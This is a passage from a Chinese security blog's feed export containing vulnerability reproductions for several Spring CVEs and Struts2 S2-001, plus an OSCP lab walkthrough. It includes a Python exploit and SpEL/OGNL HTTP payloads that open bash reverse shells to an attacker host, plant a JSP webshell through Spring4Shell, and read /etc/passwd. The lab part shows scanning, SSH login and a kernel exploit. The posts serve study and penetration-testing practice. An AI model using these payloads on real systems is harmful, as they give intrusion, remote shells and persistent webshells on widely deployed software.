class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sockjs = SockJS(url)</span><br><span class="line">    sockjs.start()</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">    sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">        &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">        &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">    sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">        &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,&quot; + command.decode(&#x27;utf-8&#x27;) + &quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;,</span><br><span class="line">        &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">        &#x27;destination&#x27;: subscribe_dest</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">    sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">        &#x27;content-length&#x27;: len(data),</span><br><span class="line">        &#x27;destination&#x27;: send_dest</span><br><span class="line">    &#125;, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;http://1:8080/gs-guide-websocket&#x27;</span><br><span class="line">    subscribe_dest = &#x27;/topic/greetings&#x27;</span><br><span class="line">    send_dest = &#x27;/app/hello&#x27;</span><br><span class="line">    lhost = &#x27;127.0.0.1&#x27;</span><br><span class="line">    lport = &#x27;9999&#x27;</span><br><span class="line">    command = base64.b64encode(&#x27;bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1&#x27;.format(lhost,lport).encode(&#x27;utf-8&#x27;))</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="五、Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#五、Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="五、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>五、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h2><h3 id="1、漏洞原因-4"><a href="#1、漏洞原因-4" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="2、影响版本-4"><a href="#2、影响版本-4" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Data Commons 1.13 到 1.13.10 </li><li>Spring Data Commons 2.0 到 2.0.5</li></ul><h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523161850728.png" alt="image-20240523161850728" style="zoom:150%;" /><p>2、漏洞点注册页面<code>/users</code></p><p><img src="/img/VulnRep-Spring/image-20240523161933560.png" alt="image-20240523161933560"></p><p>3、漏洞复现</p><p>注册并抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523162044363.png" alt="image-20240523162044363"></p><p>写入成功</p><p><img src="/img/VulnRep-Spring/image-20240523162203362.png" alt="image-20240523162203362"></p><h2 id="六、Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）"><a href="#六、Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）" class="headerlink" title="六、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）"></a>六、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</h2><h3 id="1、漏洞原因-5"><a href="#1、漏洞原因-5" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p><h3 id="2、影响版本-5"><a href="#2、影响版本-5" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Cloud Gateway 3.1.x &lt; 3.1.1</li><li>Spring Cloud Gateway 3.0.x &lt; 3.0.7</li><li>旧的、不受支持的版本也会受到影响</li></ul><h3 id="3、漏洞复现-5"><a href="#3、漏洞复现-5" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523165110802.png" alt="image-20240523165110802" style="zoom:150%;" /><p>2、添加一个恶意请求的路由。POST请求<code>/actuator/gateway/routes/pentest</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: xx.xx.xxx.xx:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like     Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line"> &quot;filters&quot;: [&#123;</span><br><span class="line">&quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">&quot;args&quot;: &#123;</span><br><span class="line">  &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">  &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165722503.png" alt="image-20240523165722503"></p><p>3、刷新路由，触发表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165843602.png" alt="image-20240523165843602"></p><p>4、查看回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523171313927.png" alt="image-20240523171313927"></p><p>5、删除路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="七、Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#七、Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="七、Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a>七、Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</h2><h3 id="1、漏洞原因-6"><a href="#1、漏洞原因-6" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p><h3 id="2、影响版本-6"><a href="#2、影响版本-6" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</li></ul><h3 id="3、漏洞复现-6"><a href="#3、漏洞复现-6" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>post 请求<code>/functionRouter</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523180738617.png" alt="image-20240523180738617"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.x.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="八、Spring框架Data-Binding与JDK-9-导致的远程代码执行漏洞（CVE-2022-22965）"><a href="#八、Spring框架Data-Binding与JDK-9-导致的远程代码执行漏洞（CVE-2022-22965）" class="headerlink" title="八、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965）"></a>八、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965）</h2><h3 id="1、漏洞原因-7"><a href="#1、漏洞原因-7" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。现在已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行。</p><p>然而，该漏洞的性质更为普遍，可能有其他方法可以利用它。可修改tomcat 日志存储路径与后缀，向日志中写入jsp</p><h3 id="2、影响版本-7"><a href="#2、影响版本-7" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Framework 版本 5.3.0 到 5.3.17、5.2.0 到 5.2.19 以及更早的版本</li></ul><h3 id="3、漏洞复现-7"><a href="#3、漏洞复现-7" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523193634539.png" alt="image-20240523193634539" style="zoom:150%;" /><p>2、添加参数：<code>name=admin&amp;age=123</code></p><img src="/img/VulnRep-Spring/image-20240523193724442.png" alt="image-20240523193724442" style="zoom:150%;" /><p>3、上poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: xx.x.x.x:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495; JSESSIONID=CF57B4777BD071833A15E58A4845A84D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该poc改变Tomcat 日志为&#96;&#96;tomcatwar.jsp&#96;，如下执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.x.x:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-cybersploit</title>
      <link href="/2024/05/22/OSCP-cybersploit/"/>
      <url>/2024/05/22/OSCP-cybersploit/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Cybersploit"><a href="#OSCP系列靶机—Cybersploit" class="headerlink" title="OSCP系列靶机—Cybersploit"></a>OSCP系列靶机—Cybersploit</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-cybersploit/image-20240522183039941.png" alt="image-20240522183039941"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183112195.png" alt="image-20240522183112195"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-cybersploit/image-20240522183344280.png" alt="image-20240522183344280"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183355717.png" alt="image-20240522183355717"></p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183633494.png" alt="image-20240522183633494"></p><p>存在robots.txt 文件</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、robots-txt-文件"><a href="#1、robots-txt-文件" class="headerlink" title="1、robots.txt 文件"></a>1、robots.txt 文件</h3><p><img src="/img/OSCP-cybersploit/image-20240522183710155.png" alt="image-20240522183710155"></p><p>base64解码，得到flag1，这个flag1的内容似乎指向一个网页</p><p><img src="/img/OSCP-cybersploit/image-20240522183915085.png" alt="image-20240522183915085"></p><h3 id="2、页面源代码"><a href="#2、页面源代码" class="headerlink" title="2、页面源代码"></a>2、页面源代码</h3><p>有一张<code>hacker.gif</code>的图片和一个账号名：<code>itsskv</code></p><p><img src="/img/OSCP-cybersploit/image-20240522184607957.png" alt="image-20240522184607957"></p><h2 id="四、getshell"><a href="#四、getshell" class="headerlink" title="四、getshell"></a>四、getshell</h2><p>后面对<code>hacker.gif</code>做了处理，没有结果，到这里陷入了僵局。</p><p>看佬的文章说，flag1的内容就是该用户名的密码。</p><p>。。。正常人谁会这么想！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh itsskv@192.168.31.51</span><br><span class="line"></span><br><span class="line">//密码：cybersploit&#123;youtube.com/c/cybersploit&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522190320913.png" alt="image-20240522190320913"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、查看-etc-passwd文件"><a href="#1、查看-etc-passwd文件" class="headerlink" title="1、查看&#x2F;etc&#x2F;passwd文件"></a>1、查看&#x2F;etc&#x2F;passwd文件</h3><p>查看<code>/etc/passwd</code>发现还存在一个<code>cybersploit</code>的用户，嗯。。。</p><p><img src="/img/OSCP-cybersploit/image-20240522190539935.png" alt="image-20240522190539935"></p><h3 id="2、flag2-txt-文件"><a href="#2、flag2-txt-文件" class="headerlink" title="2、flag2.txt 文件"></a>2、flag2.txt 文件</h3><p>有一个flag2.txt 文件</p><p><img src="/img/OSCP-cybersploit/image-20240522190839543.png" alt="image-20240522190839543"></p><p><img src="/img/OSCP-cybersploit/image-20240522190833796.png" alt="image-20240522190833796"></p><p>高低得给<code>cybersploit</code>用户尝试下</p><p><img src="/img/OSCP-cybersploit/image-20240522191006392.png" alt="image-20240522191006392"></p><p>失败了</p><h3 id="3、权限提升"><a href="#3、权限提升" class="headerlink" title="3、权限提升"></a>3、权限提升</h3><p>普通提权方式的条件都没达到，只能拿出内核提权和提权工具。尝试内核提权，内核版本<code>3.13.0</code></p><p>一眼就相中这俩了</p><p><img src="/img/OSCP-cybersploit/image-20240522193330110.png" alt="image-20240522193330110"></p><p>查看<code>37292.c</code>文件内容</p><p><img src="/img/OSCP-cybersploit/image-20240522194633367.png" alt="image-20240522194633367"></p><p>按照提示，进行提权。将该文件上传至靶机后，编译运行</p><p><img src="/img/OSCP-cybersploit/image-20240522194545011.png" alt="image-20240522194545011"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Struts2 系列漏洞复现</title>
      <link href="/2024/05/21/VulnRep-Struts2/"/>
      <url>/2024/05/21/VulnRep-Struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Struts2-系列漏洞复现"><a href="#【漏洞复现】Struts2-系列漏洞复现" class="headerlink" title="【漏洞复现】Struts2 系列漏洞复现"></a>【漏洞复现】Struts2 系列漏洞复现</h1><h2 id="一、Struts2-概述"><a href="#一、Struts2-概述" class="headerlink" title="一、Struts2 概述"></a>一、Struts2 概述</h2><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p><p>Struts 2是Apache 软件基金会下的Struts 1的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大，旨在提供更灵活、更强大的 MVC 架构来帮助开发者构建应用程序。</p><h2 id="二、s2-001-漏洞复现"><a href="#二、s2-001-漏洞复现" class="headerlink" title="二、s2-001  漏洞复现"></a>二、s2-001  漏洞复现</h2><h3 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>用户提交表单数据验证失败时，会将用户之前提交的参数值使用OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。如注册、登陆页面，提交失败后会默认返回之前提交的数据，且在后端使用 %{value} 对提交的数据进行了一次OGNL 表达式解析，因此可以直接构造payload 进行命令执行。</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.0.8</p><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="/img/VulnRep-Struts2/image-20240519150608509.png" alt="image-20240519150608509"></p><p>测试是否存在该漏洞，提交<code>%&#123;&#39;123&#39;&#125;</code>，返回结果为<code>123</code></p><p><img src="/img/VulnRep-Struts2/image-20240519150709336.png" alt="image-20240519150709336"></p><p>利用 OGNL 表达式来访问Java 系统属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;</span><br></pre></td></tr></table></figure><p>给到了用户的工作目录</p><p><img src="/img/VulnRep-Struts2/image-20240519151140263.png" alt="image-20240519151140263"></p><p>执行任意命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519151253042.png" alt="image-20240519151253042"></p><h2 id="三、s2-005-漏洞复现"><a href="#三、s2-005-漏洞复现" class="headerlink" title="三、s2-005  漏洞复现"></a>三、s2-005  漏洞复现</h2><h3 id="1、漏洞原理-1"><a href="#1、漏洞原理-1" 